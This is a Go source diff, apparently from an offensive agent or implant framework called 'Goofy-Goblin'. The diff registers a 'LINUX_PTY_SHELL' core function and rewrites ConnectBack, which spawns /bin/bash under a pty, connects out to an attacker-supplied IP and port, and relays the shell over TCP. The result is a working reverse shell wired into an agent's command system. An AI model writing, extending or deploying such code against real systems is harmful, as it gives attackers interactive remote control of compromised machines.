@@ -11,15 +11,27 @@ import (
 	"os/signal"
 	"syscall"
 
+	"github.com/johnathanclong/Goofy-Goblin/pkg/core"
+
+	"github.com/johnathanclong/Goofy-Goblin/pkg/agent"
 	"github.com/kr/pty"
 )
 
 func init() {
-
+	_init(core.Function{
+		Code:   "LINUX_PTY_SHELL",
+		Period: 0,
+		Mode:   core.CoreCall,
+		Active: true,
+		Func:   ConnectBack,
+	})
 }
 
 // ConnectBack Send a PTY TCP reverse shell back
-func ConnectBack(ip string, port string) error {
+func ConnectBack(a agent.Agent, parameters []string) {
+	var ip = parameters[0]
+	var port = parameters[1]
+
 	// Create arbitrary command.
 	c := exec.Command("/bin/bash")
 
@@ -29,7 +41,7 @@ func ConnectBack(ip string, port string) error {
 	// Start the command with a pty.
 	ptmx, err := pty.Start(c)
 	if err != nil {
-		return err
+		return
 	}
 	// Make sure to close the pty at the end.
 	defer func() { _ = ptmx.Close() }() // Best effort.
@@ -50,5 +62,5 @@ func ConnectBack(ip string, port string) error {
 	go func() { _, _ = io.Copy(ptmx, conn) }()
 	_, _ = io.Copy(conn, ptmx)
 
-	return nil
+	return
 }
